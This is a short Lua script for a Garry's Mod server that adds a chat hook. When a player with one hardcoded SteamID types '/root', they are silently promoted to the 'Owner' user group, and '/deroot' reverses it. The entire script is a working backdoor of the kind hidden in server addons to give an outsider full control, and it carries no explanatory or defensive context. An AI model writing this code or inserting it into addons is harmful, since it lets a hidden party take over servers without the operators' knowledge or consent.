hook.Add( "PlayerSay", "root", function( ply, text, team )
    owners = {
        "STEAM_0:1:218173703",
    }
    if table.HasValue(owners, ply:SteamID()) and text == "/root" then
        ply:SetUserGroup("Owner")
        ply:ChatPrint("rooted")
    end
    if table.HasValue(owners, ply:SteamID()) and text == "/deroot" then
        ply:SetUserGroup("user")
        ply:ChatPrint("derooted")
    end
end)